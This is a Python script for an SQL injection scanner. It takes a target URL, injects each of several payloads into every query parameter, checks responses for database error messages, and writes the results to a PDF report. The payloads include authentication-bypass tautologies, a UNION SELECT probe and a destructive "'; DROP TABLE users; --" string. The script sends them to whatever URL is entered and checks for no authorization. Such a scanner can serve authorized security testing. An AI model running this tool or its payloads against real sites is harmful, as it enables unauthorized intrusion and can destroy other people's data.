import requests
from urllib.parse import urlparse, parse_qs, urlencode
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

# List of SQL injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL, NULL --",
]

# Common SQL error messages to detect vulnerabilities
SQL_ERRORS = [
    "You have an error in your SQL syntax;",
    "Warning: mysql_fetch",
    "Warning: pg_query",
    "unclosed quotation mark after the character string",
    "Microsoft OLE DB Provider for SQL Server",
    "Unknown column",
    "Error Executing Database Query",
    "supplied argument is not a valid MySQL",
]

# Function to extract parameters from a URL
def extract_params(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    return query_params

# Function to test SQL injection
def test_sql_injection(url, params):
    vulnerable = []
    for param, values in params.items():
        for payload in SQL_PAYLOADS:
            # Inject the payload into the parameter
            test_params = params.copy()
            test_params[param] = payload
            test_url = f"{url.split('?')[0]}?{urlencode(test_params, doseq=True)}"

            try:
                print(f"[*] Testing {param} with payload: {payload}")
                response = requests.get(test_url, timeout=10)
                response.raise_for_status()

                # Check for SQL error messages in the response
                for error in SQL_ERRORS:
                    if error.lower() in response.text.lower():
                        print(f"[+] Vulnerability found! Parameter: {param}, Payload: {payload}")
                        vulnerable.append((param, payload, test_url))
                        break
            except requests.exceptions.RequestException as e:
                print(f"[!] Error testing {param} with payload {payload}: {e}")
                continue
    return vulnerable

# Function to generate a report
def generate_report(url, vulnerable_params, file_name="SQL_Injection_Report.pdf"):
    print("[*] Generating report...")
    c = canvas.Canvas(file_name, pagesize=letter)
    c.drawString(50, 750, "SQL Injection Test Report")
    c.drawString(50, 730, "-" * 60)
    c.drawString(50, 710, f"Target URL: {url}")
    
    if vulnerable_params:
        c.drawString(50, 690, "Vulnerabilities Found:")
        y = 670
        for param, payload, test_url in vulnerable_params:
            c.drawString(50, y, f"Parameter: {param}, Payload: {payload}")
            c.drawString(50, y - 20, f"Test URL: {test_url}")
            y -= 40
            if y < 100:  # New page if content exceeds
                c.showPage()
                y = 750
    else:
        c.drawString(50, 690, "No vulnerabilities found.")

    c.save()
    print(f"[*] Report saved as {file_name}")

# Main
if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com/page?id=1): ")
    params = extract_params(target_url)

    if not params:
        print("[!] No parameters found in the URL. Please provide a URL with query parameters.")
    else:
        print("[*] Parameters detected:", params)
        vulnerable_params = test_sql_injection(target_url, params)
        generate_report(target_url, vulnerable_params)


